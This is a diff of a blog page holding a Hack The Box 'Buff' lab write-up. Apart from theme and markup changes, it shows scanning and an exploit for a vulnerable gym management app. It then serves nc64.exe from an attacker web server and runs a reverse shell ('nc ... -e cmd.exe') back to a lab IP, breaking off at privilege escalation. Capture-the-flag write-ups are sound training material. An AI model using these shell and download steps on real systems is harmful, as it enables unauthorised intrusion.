@@ -20,13 +20,9 @@
 
 
 
-<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
-    type="text/css">
 
 
-
-<link rel="stylesheet" href="https://0xade1.github.io/devdraft/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css">
-
+<link rel="stylesheet" href="https://0xade1.github.io/devdraft/main.cd71908e0ee72a8733aeb9216405d664d48b2598bb3b750ec082bbf1b5b458cc.css" integrity="sha256-zXGQjg7nKoczrrkhZAXWZNSLJZi7O3UOwIK78bW0WMw=">
 
 
 
@@ -34,17 +30,15 @@
     <link rel="icon" type="image/png" sizes="32x32" href="https://0xade1.github.io/devdraft/favicon-32x32.png">
     <link rel="icon" type="image/png" sizes="16x16" href="https://0xade1.github.io/devdraft/favicon-16x16.png">
     <link rel="manifest" href="https://0xade1.github.io/devdraft/site.webmanifest">
-    <link rel="mask-icon" href="https://0xade1.github.io/devdraft/safari-pinned-tab.svg" color="#1b1c1d">
+    <link rel="mask-icon" href="https://0xade1.github.io/devdraft/safari-pinned-tab.svg" color="">
     <link rel="shortcut icon" href="https://0xade1.github.io/devdraft/favicon.ico">
-    <meta name="msapplication-TileColor" content="#1b1c1d">
-    <meta name="theme-color" content="#1b1c1d">
-
+    <meta name="msapplication-TileColor" content="">
 
 
 <meta itemprop="name" content="HTB - Buff">
 <meta itemprop="description" content="Bufferoverflow with immunity debugger and chisel"><meta itemprop="datePublished" content="2020-09-27T00:54:12+08:00" />
 <meta itemprop="dateModified" content="2020-09-27T00:54:12+08:00" />
-<meta itemprop="wordCount" content="2099"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
+<meta itemprop="wordCount" content="1813"><meta itemprop="image" content="https://0xade1.github.io/devdraft"/>
 <meta itemprop="keywords" content="exploitdb,chisel,msvenom,bufferoverflow,immunitydebugger,mona,SEH," />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://0xade1.github.io/devdraft"/>
@@ -81,10 +75,14 @@
 
 
 
+
+
+
     </head>
 
     
         <body>
+    
     
         <div class="container">
             <header class="header">
@@ -93,7 +91,8 @@
     <div class="logo">
         
             <span class="logo__mark">&gt;</span>
-            <span class="logo__text"># cd /draft/</span>
+            <span class="logo__text ">
+                # cd /draft/</span>
             <span class="logo__cursor" style=
                   "
                    
@@ -118,6 +117,11 @@
                     </svg>
                 </span>
             
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
         </span>
     </span>
 </header>
@@ -128,43 +132,11 @@
   <main class="post">
 
     <div class="post-info">
-      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-lin      ecap="round" stroke-linejoin="round" class="feather feather-calendar">
-  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
-  <line x1="16" y1="2" x2="16" y2="6"></line>
-  <line x1="8" y1="2" x2="8" y2="6"></line>
-  <line x1="3" y1="10" x2="21" y2="10"></line>
-</svg>
-
-  2020-09-26 
+      <p>
 
 
-  
- |
-
-      
-
-      
-
-      
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
-
-        <span class="tag"><a href="https://0xade1.github.io/devdraft/categories/htb-windows/">htb-windows</a></span>
-        <span class="tag"><a href="https://0xade1.github.io/devdraft/categories/uncomplete/">uncomplete</a></span>
         
-        |
-
-
-      
-        |
-        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
-
-        <span class="tag"><a href="https://0xade1.github.io/devdraft/series/htb/">htb</a></span>
-        
-        |
-
-
-      
-
+      </p>
     </div>
 
     <article>
@@ -197,7 +169,7 @@
       
         <figure class="post-cover">
           <img src="https://www.hackthebox.eu/images/logo-htb.svg" alt="HTB - Buff" />
-
+          
           
         </figure>
       
@@ -232,24 +204,11 @@
         </aside>
         <hr />
 
+      
+
       <div class="post-content">
         <h2 id="nmap">nmap</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  buff nmap -p- -T4 --min-rate<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3000</span> 10.10.10.198 -Pn
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  buff nmap -p- -T4 --min-rate<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3000</span> 10.10.10.198 -Pn
 </span></span><span style="display:flex;"><span>PORT     STATE SERVICE
 </span></span><span style="display:flex;"><span>8080/tcp open  http-proxy
 </span></span><span style="display:flex;"><span>
@@ -260,55 +219,12 @@
 </span></span><span style="display:flex;"><span>|_Methods supported:CONNECTION
 </span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.43 <span style="color:#ff79c6">(</span>Win64<span style="color:#ff79c6">)</span> OpenSSL/1.1.1g PHP/7.4.6
 </span></span><span style="display:flex;"><span>|_http-title: mrb3n&#39;s Bro Hut
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="gobuster">gobuster</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  buff gobuster dir -u http://10.10.10.198:8080/ -w /opt/dictionaries/common.txt
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Nothing special can be found</p>
+</span></span></code></pre></div><h2 id="gobuster">gobuster</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  buff gobuster dir -u http://10.10.10.198:8080/ -w /opt/dictionaries/common.txt
+</span></span></code></pre></div><p>Nothing special can be found</p>
 <p>going to http://10.10.10.198:8080/contact.php, we can read : <code> Made using Gym Management Software 1.0</code></p>
 <h2 id="searchsploit">searchsploit</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  buff searchsploit gym
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  buff searchsploit gym
 </span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------ ---------------------------------
 </span></span><span style="display:flex;"><span> Exploit Title                                                                      |  Path
 </span></span><span style="display:flex;"><span>------------------------------------------------------------------------------------ ---------------------------------
@@ -338,45 +254,10 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">26/09/2020  11:42                67 kamehameha.php
 </span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">               1 File(s)             67 bytes
 </span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">               2 Dir(s)   9,751,343,104 bytes free
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p>We loose the shell because of encoding mishandling, so we modify the exploit a bit at line 62 and we re-execute the exploit</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(response2<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>We start a web server on port 9001 to upload nc.exe; we use powershell to download nc64.exe binary</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  http python3 -m http.server <span style="color:#bd93f9">9001</span>
+</span></span></span></code></pre></div><p>We loose the shell because of encoding mishandling, so we modify the exploit a bit at line 62 and we re-execute the exploit</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">print</span>(response2<span style="color:#ff79c6">.</span>encode(<span style="color:#f1fa8c">&#39;utf-8&#39;</span>))
+</span></span></code></pre></div><p>We start a web server on port 9001 to upload nc.exe; we use powershell to download nc64.exe binary</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>_  http python3 -m http.server <span style="color:#bd93f9">9001</span>
 </span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#bd93f9">9001</span> <span style="color:#ff79c6">(</span>http://0.0.0.0:9001/<span style="color:#ff79c6">)</span> ...
 </span></span><span style="display:flex;"><span>172.19.0.1 - - <span style="color:#ff79c6">[</span>26/Sep/2020 18:59:10<span style="color:#ff79c6">]</span> <span style="color:#f1fa8c">&#34;GET /nc64.exe HTTP/1.1&#34;</span> <span style="color:#bd93f9">200</span> -
 </span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────────────────────────────
@@ -398,24 +279,8 @@
 </span></span><span style="display:flex;"><span>26/09/2020  12:01            35,282 nc.exe
 </span></span><span style="display:flex;"><span>               <span style="color:#bd93f9">2</span> File<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>         35,349 bytes
 </span></span><span style="display:flex;"><span>               <span style="color:#bd93f9">2</span> Dir<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span>   9,751,212,032 bytes free
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>Upload was successful, we can now get a shell</p>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; nc 10.10.14.6 <span style="color:#bd93f9">9002</span> -e cmd.exe
+</span></span></code></pre></div><p>Upload was successful, we can now get a shell</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt; nc 10.10.14.6 <span style="color:#bd93f9">9002</span> -e cmd.exe
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>──────────────────────────────────────────────────────────────────────────────────────────────────
 </span></span><span style="display:flex;"><span>_  buff rlwrap nc -lnvvp <span style="color:#bd93f9">9002</span>
@@ -425,35 +290,8 @@
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">(</span>c<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2018</span> Microsoft Corporation. All rights reserved.
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\x</span>ampp<span style="color:#f1fa8c">\h</span>tdocs<span style="color:#f1fa8c">\g</span>ym<span style="color:#f1fa8c">\u</span>pload&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="user-flag">user flag</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt; whoami
+</span></span></code></pre></div><h2 id="user-flag">user flag</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt; whoami
 </span></span><span style="display:flex;"><span>whoami
 </span></span><span style="display:flex;"><span>buff<span style="color:#f1fa8c">\s</span>haun
 </span></span><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>ownloads&gt; whoami /priv
@@ -474,40 +312,11 @@
 </span></span><span style="display:flex;"><span>C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\s</span>haun<span style="color:#f1fa8c">\D</span>esktop&gt;type user.txt
 </span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">type</span> user.txt
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>Redacted<span style="color:#ff79c6">]</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="privilege-escalation">privilege escalation</h2>
-<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
-<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
